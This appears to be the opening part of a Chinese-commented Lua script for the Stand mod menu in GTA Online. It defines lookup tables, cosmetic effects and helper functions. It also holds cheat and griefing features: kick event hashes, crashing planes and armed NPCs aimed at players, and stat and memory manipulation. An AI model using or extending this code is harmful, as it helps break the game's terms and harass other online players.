--===感谢Yuzi/凉夜/Ikun----》》》》》》》》》》》》》》
--Dog白又看你爹脚本呢？？？
--Dog白又看你爹脚本呢？？？
--Dog白又看你爹脚本呢？？？
--Dog白又看你爹脚本呢？？？
--Dog白又看你爹脚本呢？？？
--Dog白又看你爹脚本呢？？？
--Dog白又看你爹脚本呢？？？
--Dog白又看你爹脚本呢？？？
--Dog白又看你爹脚本呢？？？
--Dog白又看你爹脚本呢？？？
--Dog白又看你爹脚本呢？？？
--Dog白又看你爹脚本呢？？？
--Dog白又看你爹脚本呢？？？
local object_stuff = {
    names = {
        "摩天轮",
        "UFO",
        "水泥搅拌车",
        "脚手架",
        "车库门",
        "保龄球",
        "足球",
        "橘子",
        "特技坡道",

    },
    objects = {
        "prop_ld_ferris_wheel",
        "p_spinning_anus_s",
        "prop_staticmixer_01",
        "prop_towercrane_02a",
        "des_scaffolding_root",
        "prop_sm1_11_garaged",
        "stt_prop_stunt_bowling_ball",
        "stt_prop_stunt_soccer_ball",
        "prop_juicestand",
        "stt_prop_stunt_jump_l",
    }
}
local values = {
    [0] = 0,
    [1] = 50,
    [2] = 88,
    [3] = 160,
    [4] = 208,
}
active_bowling_balls = 0
windows = {
    {name = "左前", number = 0},
    {name = "右前", number = 1},
    {name = "左后", number = 2},
    {name = "右后", number = 3},
    {name = "前挡风玻璃", number = 4},
    {name = "后挡风玻璃", number = 5},
    {name = "左中", number = 6},
    {name = "中右", number = 7}
}
hud_rgb_index = 1
hud_rgb_colors = {6, 18, 9}
cTime = util.current_time_millis
Version = "10.6.2"
function SETUP_SINGLE_LINE(scaleform)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SETUP_SINGLE_LINE")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.5)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.5)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(70.0)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(125.0)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("left")
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end
function ADD_TEXT_TO_SINGLE_LINE(scaleform, text, font, colour)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "ADD_TEXT_TO_SINGLE_LINE")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("presents")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(text)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(font)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(colour)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_BOOL(true)
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end
function ends_with(str, ending)
    return ending == "" or str:sub(-#ending) == ending
 end
colors = {
    green = 190,
    red = 15,
    yellow = 173,
    black = 21,
    white = 4,
    gray = 7,
    pink = 255,
    purple = 75, 
    blue = 18
    }
ufomodels = {
	"imp_prop_ship_01a",
	"sum_prop_dufocore_01a"
}
disguise_object = 0
disguise_objects = {
    [0] = "prop_bush_med_03",
    [1] = "prop_tree_lficus_06",
    [2] = "prop_palm_fan_03_b",
    [3] = "prop_streetlight_01",
    [4] = "prop_recyclebin_04_b" -- Good to clip the player under the terrain
}
disguise_names = {
    [0] = "灌木丛",
    [1] = "树",
    [2] = "棕榈树",
    [3] = "路灯",
    [4] = "垃圾桶"
}
station_name = {
    ["布莱恩郡之声电台"] = "RADIO_11_TALK_02", 
    ["蓝色方舟电台"] = "RADIO_12_REGGAE",
    ["全球电台"] = "RADIO_13_JAZZ",
    ["飞莲电台"] = "RADIO_14_DANCE_02",
    ["真相911电台"] = "RADIO_15_MOTOWN",
    ["实验室电台"] = "RADIO_20_THELAB",
    ["明镜公园之声电台"] = "RADIO_16_SILVERLAKE",
    ["103.2空间电台"] = "RADIO_17_FUNK",
    ["好麦坞大道电台"] = "RADIO_18_90S_ROCK",
    ["金发洛圣都 97.8 FM"] = "RADIO_21_DLC_XM17",
    ["洛圣都地下电台"] = "RADIO_22_DLC_BATTLE_MIX1_RADIO",
    ["iFruit电台"] = "RADIO_23_DLC_XM19_RADIO",
    ["摩托妈咪电台"] = "RADIO_19_USER",
    ["洛圣都摇滚电台"] = "RADIO_01_CLASS_ROCK",
    ["无止境流行音乐电台"] = "RADIO_02_POP",
    ["洛圣都广播电台"] = "RADIO_03_HIPHOP_NEW",
    ["X 频道电台"] = "RADIO_04_PUNK",
    ["音乐柜-谈话电台"] = "RADIO_05_TALK_01",
    ["叛逆电台"] = "RADIO_06_COUNTRY", 
    ["灵魂之蜡电台"] = "RADIO_07_DANCE_01",
    ["东洛电台"] = "RADIO_08_MEXICAN",
    ["我玩的就是西海岸-西海岸经典"] = "RADIO_09_HIPHOP_OLD",
    ["媒体播放器"] = "RADIO_36_AUDIOPLAYER",
    ["音乐柜"] = "RADIO_35_DLC_HEI4_MLR",
    ["库尔特FM"] = "RADIO_34_DLC_HEI4_KULT",
    ["放松依旧洛圣都"] = "RADIO_27_DLC_PRHEI4",
}
visual_stuff = {
    {"提升亮度", "AmbientPush"},
    {"提升饱和度", "rply_saturation"},
    {"提升曝光度", "LostTimeFlash"},
    {"雾之夜", "casino_main_floor_heist"},
    {"更好的夜晚", "dlc_island_vault"},
    {"正常雾天", "Forest"},
    {"大雾天", "nervousRON_fog"},
    {"黄昏天", "MP_Arena_theme_evening"},
    {"暖色调", "mp_bkr_int01_garage"},
    {"死气沉沉", "MP_deathfail_night"},
    {"石化", "stoned"},
    {"水下", "underwater"},
}
util.show_corner_help("~o~宇宙第一帅的从前从前:\n~g~欢迎来到CqCqscript!!!\n~r~你个宇宙第二帅的吊毛\n一定要玩的开心啊!!!")
drugged_effects = {
    "药品 1",
    "药品 2",
    "药品 3",
    "药品 4",
    "药品 5",
    "药品 6",
    "药品 7",
    "药品 8",
}
local visual_stuff = {
    {"提升亮度", "AmbientPush"},
    {"提升饱和度", "rply_saturation"},
    {"提升曝光度", "LostTimeFlash"},
    {"雾之夜", "casino_main_floor_heist"},
    {"更好的夜晚", "dlc_island_vault"},
    {"正常雾天", "Forest"},
    {"大雾天", "nervousRON_fog"},
    {"黄昏天", "MP_Arena_theme_evening"},
    {"暖色调", "mp_bkr_int01_garage"},
    {"死气沉沉", "MP_deathfail_night"},
    {"石化", "stoned"},
    {"水下", "underwater"},
}
s_forcefield_range = 20
s_forcefield = 0
s_forcefield_names = {
    [0] = "推",
    [1] = "发射",
    [2] = "拉"
}
allfirelist = {
    '烟花',
    '榴弹',
    '重型狙击',
    '燃烧瓶',
    '轨道枪',
    '火箭炮',
    '雪球',
    '邪恶冥王',
    '脉冲',
 }

 afWeap = {
    'weapon_firework',
    'weapon_grenadelauncher',
    'weapon_heavysniper_mk2',
    'WEAPON_MOLOTOV',
    'weapon_railgun',
    'WEAPON_RPG',
    'WEAPON_SNOWBALL',
    'weapon_raycarbine',
    'weapon_raypistol',
 }
CqKick = {
    1674887089,
    608596116,
    1781594056,
    -442434037
        }
 some_ped_list = {
    "a_m_m_bevhills_02",    --1
    "a_m_m_business_01",    --2
    "a_m_m_bevhills_01",    --3
    "a_m_m_farmer_01",      --4
    "a_m_m_paparazzi_01",   --5
    "a_m_m_prolhost_01",    --6
    "a_m_m_stlat_02"        --7
}
explosion_names = {"Off",
    "Grenade",
    "Grenade Launcher",
    "Sticky Bomb",
    "Molotov",
    "Rocket",
    "Tankshell",
    "Octane",
    "Car",
    "Plane",
    "Petrol Pump",
    "Bike",
    "Steam",
    "Flame",
    "Water Hydrant",
    "Gas Canister",
    "Boat",
    "Ship Destroyed",
    "Truck",
    "Bullet",
    "Smoke Grenade Launcer",
    "Smoke Grenade",
    "BZ Gas",
    "Flare",
    "Gas Canister",
    "EXtinguisher",
    "Programmable AR",
    "Train",
    "Barrel",
    "Propane",
    "Blimp",
    "Flame Explosion",
    "Tanker",
    "Plane Rocket",
    "Vehicle Bullet",
    "Gas Tanker",
    "Bird Crap",
    "Railgun",
    "Blimp 2",
    "Firework",
    "Snowball",
    "Priximity Mine",
    "Valkyrie Cannon",
    "Air Defense",
    "Pipebomb",
    "Vehicle Mine",
    "Explosive Ammo",
    "APC Shell",
    "Cluster Bomb",
    "Gas Bomb",
    "Incendiary Bomb",
    "Standard Bomb",
    "Torpedo",
    "Underwater Torpedo",
    "Bombushka Cannon",
    "Secondary Bomb Cluster",
    "Hunter Barrage",
    "Hunter Cannon",
    "Rogue Cannon",
    "Underwater Mine",
    "Orbital Cannon",
    "Wide Standard Bomb",
    "Explosive Ammo Shotgun",
    "Oppressor MK2 Cannon",
    "Kinetic Mortar",
    "Kinetic Vehicle Mine",
    "EMP Vehicle Mine",
    "Spike Vehicle Mine",
    "Slick Vehicle Mine",
    "TAR Vehicle Mine",
    "Drone",
    "Raygun",
    "Buried Mine",
    "Script Missile",
}
hiteffectchinese = {
	{"小丑爆炸"},
	{"小丑出现"},
	{"开拓者FW"},
	{"烟花"},
	{"喷泉FW"},
	{"外星解体"},
	{"小丑花"},
	{"地面冲击波FW"},
	{"小丑木兹"},
}
ped_flags = {}
explosion_names = {"Off",
    "Grenade",
    "Grenade Launcher",
    "Sticky Bomb",
    "Molotov",
    "Rocket",
    "Tankshell",
    "Octane",
    "Car",
    "Plane",
    "Petrol Pump",
    "Bike",
    "Steam",
    "Flame",
    "Water Hydrant",
    "Gas Canister",
    "Boat",
    "Ship Destroyed",
    "Truck",
    "Bullet",
    "Smoke Grenade Launcer",
    "Smoke Grenade",
    "BZ Gas",
    "Flare",
    "Gas Canister",
    "EXtinguisher",
    "Programmable AR",
    "Train",
    "Barrel",
    "Propane",
    "Blimp",
    "Flame Explosion",
    "Tanker",
    "Plane Rocket",
    "Vehicle Bullet",
    "Gas Tanker",
    "Bird Crap",
    "Railgun",
    "Blimp 2",
    "Firework",
    "Snowball",
    "Priximity Mine",
    "Valkyrie Cannon",
    "Air Defense",
    "Pipebomb",
    "Vehicle Mine",
    "Explosive Ammo",
    "APC Shell",
    "Cluster Bomb",
    "Gas Bomb",
    "Incendiary Bomb",
    "Standard Bomb",
    "Torpedo",
    "Underwater Torpedo",
    "Bombushka Cannon",
    "Secondary Bomb Cluster",
    "Hunter Barrage",
    "Hunter Cannon",
    "Rogue Cannon",
    "Underwater Mine",
    "Orbital Cannon",
    "Wide Standard Bomb",
    "Explosive Ammo Shotgun",
    "Oppressor MK2 Cannon",
    "Kinetic Mortar",
    "Kinetic Vehicle Mine",
    "EMP Vehicle Mine",
    "Spike Vehicle Mine",
    "Slick Vehicle Mine",
    "TAR Vehicle Mine",
    "Drone",
    "Raygun",
    "Buried Mine",
    "Script Missile",
}
refbypass = menu.ref_by_path
getvalue = menu.get_value
otrBlipColour = 58
ped_limit = 175
veh_limit = 150
obj_limit = 500
projectile_limit = 25




util.keep_running()
Config = {
	controls = {
		vehicleweapons = 86,
		airstrikeaircraft = 86
	},
	general = {
		standnotifications = false,
		displayhealth = true,
		language = "english",
		developer = false, 	-- developer flag (enables/disables some debug features)
		showintro = true
	},
	ufo = {
		disableboxes = false, 	-- determines if boxes are drawn on players to show their position
		targetplayer = false 	-- wether tractor beam only targets players or not
	},
	vehiclegun = {
		disablepreview = false,
	},
	healthtxtpos = {
		x = 0.03,
		y = 0.05
	}
}
store = filesystem.store_dir()
CqCqScript_store = store .. "/CqCqScript"
settings_filepath = CqCqScript_store.."/settings.txt"
function read_settings_file()
    local filehandle = io.open(settings_filepath)
    local tbl = {}
    if filehandle then
        for line_text in filehandle:lines() do ---@diagnostic disable-next-line
            local prefix, suffix = string.partition(line_text, "=")
            if prefix == "hide_name_on_script_startup" then
                tbl.hide_name_on_script_startup = suffix == "true"
            end
        end
        return tbl
    else
        util.toast("Error reading settings file.")
    end
end
---@param addr integer
---@param offsets integer[]
---@return integer
function addr_from_pointer_chain(addr, offsets)
	if addr == 0 then return 0 end
	for k = 1, (#offsets - 1) do
		addr = memory.read_long(addr + offsets[k])
		if addr == 0 then return 0 end
	end
	addr = addr + offsets[#offsets]
	return addr
end
function zuijiumoshi(val)
if val > 0 then
    CAM.SHAKE_GAMEPLAY_CAM("DRUNK_SHAKE", val)
    GRAPHICS.SET_TIMECYCLE_MODIFIER("Drunk")
else
    GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
    CAM.SHAKE_GAMEPLAY_CAM("DRUNK_SHAKE", 0)
end
end

function VicecityWater()
if ENTITY.IS_ENTITY_IN_WATER(players.user_ped()) and not PED.IS_PED_DEAD_OR_DYING(players.user_ped()) then
    menu.trigger_commands("ewo")
end
end
function chibangnie(on_toggle)
if on_toggle then	
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
	local wings = OBJECT.CREATE_OBJECT(util.joaat("vw_prop_art_wings_01a"), pos.x, pos.y, pos.z, true, true, true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("vw_prop_art_wings_01a"))
	ENTITY.ATTACH_ENTITY_TO_ENTITY(wings, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 0x5c01), -1.0, 0.0, 0.0, 0.0, 90.0, 0.0, false, true, false, true, 0, true)
else
	local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			end

end
---@param name string
---@return integer
function request_scaleform_movie(name)
	local handle
	util.spoof_script("main_persistent", function ()
		handle = GRAPHICS.REQUEST_SCALEFORM_MOVIE(name)
	end)
	return handle
end

function interpolate(y0, y1, perc)
	perc = perc > 1.0 and 1.0 or perc
	return (1 - perc) * y0 + perc * y1
end
Instructional = {scaleform = 0}

---@return boolean
function Instructional:begin ()
	if GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(self.scaleform) then
		GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(self.scaleform, "CLEAR_ALL")
		GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

    	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(self.scaleform, "TOGGLE_MOUSE_BUTTONS")
		GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_BOOL(true)
		GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

		self.position = 0
        return true
	else
		self.scaleform = request_scaleform_movie("instructional_buttons")
		return false
    end
end
---@param index integer
---@param name string
---@param button string
function Instructional:add_data_slot(index, name, button)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(self.scaleform, "SET_DATA_SLOT")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(self.position)

    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_PLAYER_NAME_STRING(button)
    if HUD.DOES_TEXT_LABEL_EXIST(name) then
		GRAPHICS.BEGIN_TEXT_COMMAND_SCALEFORM_STRING(name)
		GRAPHICS.END_TEXT_COMMAND_SCALEFORM_STRING()
	else
		GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(name)
	end
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_BOOL(false)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(index)
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
	self.position = self.position + 1
end


---@param index integer
---@param name string
function Instructional.add_control(index, name)
	local button = PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(2, index, true)
    Instructional:add_data_slot(index, name, button)
end





---@param r integer
---@param g integer
---@param b integer
---@param a integer
function Instructional:set_background_colour(r, g, b, a)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(self.scaleform, "SET_BACKGROUND_COLOUR")
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(r)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(g)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(b)
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(a)
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end


function Instructional:draw ()
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(self.scaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()

    GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(self.scaleform, 255, 255, 255, 220, 0)
	self.position = 0
end
function renzhepao(on)
local renzhe = "missfbi1"
    local pao = "ledge_loop"
            while not STREAMING.HAS_ANIM_DICT_LOADED(renzhe) do 
                STREAMING.REQUEST_ANIM_DICT(renzhe)
                util.yield()
            end
            if on then
                menu.trigger_commands("walkspeed 3.1")
                menu.trigger_commands("superrun 0.75")
                menu.trigger_commands("grace on")
                TASK.TASK_PLAY_ANIM(players.user_ped(), renzhe, pao, 3, 3, -1, 51, 0, false, false, false)
                PED.SET_ENABLE_HANDCUFFS(players.user_ped(),on)
            else
                menu.trigger_commands("walkspeed 1")
                menu.trigger_commands("superrun 0")
                menu.trigger_commands("grace off")
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
                PED.SET_ENABLE_HANDCUFFS(players.user_ped(),off)
            end
        end
        function caidancargun()
        if PED.IS_PED_SHOOTING(players.user_ped()) then
            local entity = get_entity_player_is_aiming_at(players.user())
            if entity ~= NULL and ENTITY.IS_ENTITY_A_VEHICLE(entity) and request_control(entity, 1000) then
                local primary, secundary = get_random_colour(), get_random_colour()
                VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(entity, primary.r, primary.g, primary.b)
                VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(entity, secundary.r, secundary.g, secundary.b)
            end
        end
    end
  
function xuancaipm(on)
    local a_toggle = menu.ref_by_path('World>Aesthetic Light>Aesthetic Light')
    if on then 
        menu.trigger_commands("shader glasses_purple")
        menu.trigger_commands("aestheticcolourred 255")
        menu.trigger_commands("aestheticcolourgreen 0")
        menu.trigger_commands("aestheticcolourblue 255")
        menu.trigger_commands("aestheticrange 10000")
        menu.trigger_commands("aestheticintensity 30")
        menu.trigger_commands("time 0")
        menu.set_value(a_toggle, true)
    else
        menu.set_value(a_toggle, false)
        menu.trigger_commands("shader off")
    end
end
function set_entity_face_entity(entity, target, usePitch)
    local pos1 = ENTITY.GET_ENTITY_COORDS(entity, false)
    local pos2 = ENTITY.GET_ENTITY_COORDS(target, false)
    local rel = v3.new(pos2)
    rel:sub(pos1)
    local rot = rel:toRot()
    if not usePitch then
        ENTITY.SET_ENTITY_HEADING(entity, rot.z)
    else
        ENTITY.SET_ENTITY_ROTATION(entity, rot.x, rot.y, rot.z, 2, 0)
    end
end
vehicle_uses = 0
ped_uses = 0
pickup_uses = 0
player_uses = 0
object_uses = 0
robustmode = false

function mod_uses(type, incr)
    -- this func is a patch. every time the script loads, all the toggles load and set their state. in some cases this makes the _uses optimization negative and breaks things. this prevents that.
    if incr < 0 and is_loading then
        -- ignore if script is still loading
        ls_log("Not incrementing use var of type " .. type .. " by " .. incr .. "- script is loading")
        return
    end
    ls_log("Incrementing use var of type " .. type .. " by " .. incr)
    if type == "vehicle" then
        if vehicle_uses <= 0 and incr < 0 then
            return
        end
        vehicle_uses = vehicle_uses + incr
    elseif type == "pickup" then
        if pickup_uses <= 0 and incr < 0 then
            return
        end
        pickup_uses = pickup_uses + incr
    elseif type == "ped" then
        if ped_uses <= 0 and incr < 0 then
            return
        end
        ped_uses = ped_uses + incr
    elseif type == "player" then
        if player_uses <= 0 and incr < 0 then
            return
        end
        player_uses = player_uses + incr
    elseif type == "object" then
        if object_uses <= 0 and incr < 0 then
            return
        end
        object_uses = object_uses + incr
    end
end

 angry_planes = false
 angry_planes_tar = 0
function start_angryplanes_thread()
    util.create_thread(function()
        local v_hashes = {util.joaat('lazer'), util.joaat('jet'), util.joaat('cargoplane'), util.joaat('titan'), util.joaat('luxor'), util.joaat('seabreeze'), util.joaat('vestra'), util.joaat('volatol'), util.joaat('tula'), util.joaat('buzzard'), util.joaat('avenger')}
        if angry_planes_tar == 0 then 
            angry_planes_tar = players.user_ped()
        end
        while true do
            if not angry_planes then 
                util.stop_thread()
            end
            local p_hash = util.joaat('s_m_m_pilot_01')
            local radius = 200
            local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(angry_planes_tar, math.random(-radius, radius), math.random(-radius, radius), math.random(600, 800))
            local pick = v_hashes[math.random(1, #v_hashes)]
            request_model_load(pick)
            local aircraft = entities.create_vehicle(pick, c, math.random(0, 270))
            set_entity_face_entity(aircraft, angry_planes_tar, true)
            VEHICLE.SET_VEHICLE_ENGINE_ON(aircraft, true, true, false)
            VEHICLE.SET_HELI_BLADES_FULL_SPEED(aircraft)
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(aircraft, VEHICLE.GET_VEHICLE_ESTIMATED_MAX_SPEED(aircraft)+1000.0)
            VEHICLE.SET_VEHICLE_OUT_OF_CONTROL(aircraft, true, true)
            --local blip = HUD.ADD_BLIP_FOR_ENTITY(aircraft)
            --HUD.SET_BLIP_SPRITE(blip, 90)
            --HUD.SET_BLIP_COLOUR(blip, 75)
            util.yield(5000)
        end
    end)
end

function read_settings_file()
    local filehandle = io.open(settings_filepath)
    local tbl = {}
    if filehandle then
        for line_text in filehandle:lines() do ---@diagnostic disable-next-line
            local prefix, suffix = string.partition(line_text, "=")
            if prefix == "hide_name_on_script_startup" then
                tbl.hide_name_on_script_startup = suffix == "true"
            end
        end
        return tbl
    else
        util.toast("Error reading settings file.")
    end
end
settings = read_settings_file()
user_name = settings.hide_name_on_script_startup and "User" or players.get_name(players.user())
possible_welcome_phrases = { -- 12 normal, 1 rare
    "很高兴你来了, %s.",
    "欢迎, %s. 谢谢你使用了我的脚本.",
    "%s 进入脚本.",
    "欢迎, %s. 你好啊!",
    "%s 谢谢你.",
    "很高兴你使用这个脚本, %s.",
    "玩起来吧！, %s!",
    "%s 成功着陆！.",
    "很高兴见到你, %s.",
    "%s 高调出场!",
    "%s 在这里耶.",
    "%s 跳到脚本中.",
    "Hey %s, 你应该加我的群一起聊天捏！！！"
}
function GET_NEARBY_PEDS(pid, radius) --returns a list of nearby peds given player Id
	local peds = {}
	local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(p)
	for k, ped in pairs(entities.get_all_peds_as_handles()) do
		if ped ~= p then
			local ped_pos = ENTITY.GET_ENTITY_COORDS(ped)
			if vect.dist(pos, ped_pos) <= radius then table.insert(peds, ped) end
		end
	end
	return peds
end
function MP_Index()
    local MP_IPTR = memory.alloc(2)
    STATS.STAT_GET_INT(util.joaat("MPPLY_LAST_MP_CHAR"), MP_IPTR, -1)
    return memory.read_int(MP_IPTR)
end

function STAT_GET_INT(Stat)
    local IntPTR = memory.alloc(4)

    if string.find(Stat, "MPPLY_") or string.find(Stat, "MP_") then
        STATS.STAT_GET_INT(util.joaat(Stat), IntPTR, -1)
    else
        STATS.STAT_GET_INT(util.joaat(MP_INDEX() .. Stat), IntPTR, -1)
    end

    return memory.read_int(IntPTR)
end

function STAT_SET_FLOAT(Hash, Value)
    if MP_Index() == 0 then
        STATS.STAT_SET_FLOAT(util.joaat("MP0_"..Hash), Value, true)
    else
        STATS.STAT_SET_FLOAT(util.joaat("MP1_"..Hash), Value, true)
    end
end
 function STAT_SET_BOOL(Hash, Value)
    if MP_Index() == 0 then
        STATS.STAT_SET_BOOL(util.joaat("MP0_"..Hash), Value, true)
    else
        STATS.STAT_SET_BOOL(util.joaat("MP1_"..Hash), Value, true)
    end
end
---@param player Player
---@return Entity
function get_entity_player_is_aiming_at(player)
	if not PLAYER.IS_PLAYER_FREE_AIMING(player) then
		return NULL
	end
	local entity, pEntity = NULL, memory.alloc_int()
	if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(player, pEntity) then
		entity = memory.read_int(pEntity)
	end
	if entity ~= NULL and ENTITY.IS_ENTITY_A_PED(entity) and PED.IS_PED_IN_ANY_VEHICLE(entity, false) then
		entity = PED.GET_VEHICLE_PED_IS_IN(entity, false)
	end
	return entity
end
---@return Colour
function get_random_colour()
	local colour = {a = 255}
	colour.r = math.random(0,255)
	colour.g = math.random(0,255)
	colour.b = math.random(0,255)
	return colour
end

function smolblip(entity, blipSprite, colour)
	local blip = HUD.ADD_BLIP_FOR_ENTITY(entity)
	HUD.SET_BLIP_SPRITE(blip, blipSprite)
	HUD.SET_BLIP_COLOUR(blip, colour)
	HUD.SHOW_HEIGHT_ON_BLIP(blip, false)
	HUD.SET_BLIP_ROTATION(blip, SYSTEM.CEIL(ENTITY.GET_ENTITY_HEADING(entity)))
	NETWORK.SET_NETWORK_ID_CAN_MIGRATE(entity, false)
	HUD.SET_BLIP_SCALE(blip, 0.5)
	util.create_thread(function()
		while not ENTITY.IS_ENTITY_DEAD(entity) do
			local heading = ENTITY.GET_ENTITY_HEADING(entity)
			HUD.SET_BLIP_ROTATION(blip, SYSTEM.CEIL(heading))
		wait()
		end
			
		if ENTITY.IS_ENTITY_DEAD(entity) then
			util.remove_blip(blip)
		end
	end)
	return blip
end
function addBlipForEntity(entity, blipSprite, colour)
	local blip = HUD.ADD_BLIP_FOR_ENTITY(entity)
	HUD.SET_BLIP_SPRITE(blip, blipSprite)
	HUD.SET_BLIP_COLOUR(blip, colour)
	HUD.SHOW_HEIGHT_ON_BLIP(blip, false)
	HUD.SET_BLIP_ROTATION(blip, SYSTEM.CEIL(ENTITY.GET_ENTITY_HEADING(entity)))
	NETWORK.SET_NETWORK_ID_CAN_MIGRATE(entity, false)
	util.create_thread(function()
		while not ENTITY.IS_ENTITY_DEAD(entity) do
			local heading = ENTITY.GET_ENTITY_HEADING(entity)
			HUD.SET_BLIP_ROTATION(blip, SYSTEM.CEIL(heading))
		wait()
		end
			
		if ENTITY.IS_ENTITY_DEAD(entity) then
			util.remove_blip(blip)
		end
	end)
	return blip
end
function wuzhuangfib(ob_click)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicleHash = util.joaat("fbi2")
		local pedHash = 1558115333
		requestModels(vehicleHash, pedHash)
		local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(targetPed)
		local vehicle = entities.create_vehicle(vehicleHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
		if not ENTITY.DOES_ENTITY_EXIST(vehicle) then
			return
		end

		local offset = getOffsetFromEntityGivenDistance(vehicle, 50.0)
		local outCoords = v3.new()
		local outHeading = memory.alloc()

		if PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(offset.x, offset.y, offset.z, outCoords, outHeading, 1, 3.0, 0) then
			ENTITY.SET_ENTITY_COORDS(vehicle, v3.getX(outCoords), v3.getY(outCoords), v3.getZ(outCoords))
			ENTITY.SET_ENTITY_HEADING(vehicle, memory.read_float(outHeading))
			VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
		end
        for i=-1, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(vehicle) - 1 do
            local clown = entities.create_ped(2, pedHash, outCoords, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            PED.SET_PED_INTO_VEHICLE(clown, vehicle, i)
            if i % 2 == 0 then
				WEAPON.GIVE_WEAPON_TO_PED(clown, 584646201 , 9999, false, true)
				PED.SET_PED_FIRING_PATTERN(clown, -957453492)
            else
				WEAPON.GIVE_WEAPON_TO_PED(clown, 584646201 , 9999, false, true)
				PED.SET_PED_FIRING_PATTERN(clown, -957453492)
            end
			PED.SET_PED_AS_COP(clown, true)
			addBlipForEntity(vehicle, 812, 40)
			PED.SET_PED_CONFIG_FLAG(clown, 281, true)
			PED.SET_PED_CONFIG_FLAG(clown, 2, true)
			PED.SET_PED_CONFIG_FLAG(clown, 33, false)
            PED.SET_PED_COMBAT_ATTRIBUTES(clown, 5, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(clown, 46, true)
			PED.SET_PED_ACCURACY(clown, 100.0)
			PED.SET_PED_HEARING_RANGE(clown, 99999)
			PED.SET_PED_RANDOM_COMPONENT_VARIATION(clown, 0)
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 3)
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "FIB")
			VEHICLE.SET_VEHICLE_EXPLODES_ON_HIGH_EXPLOSION_DAMAGE(vehicle, false)
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 50)
			PED.SET_PED_MAX_HEALTH(clown, 150)
			ENTITY.SET_ENTITY_PROOFS(ped, false, true, false, false, true, false, false, false)
			ENTITY.SET_ENTITY_HEALTH(clown, 150)
			PED.SET_PED_ARMOUR(clown, 100)
			PED.SET_PED_SHOOT_RATE(clown, 5)
			VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
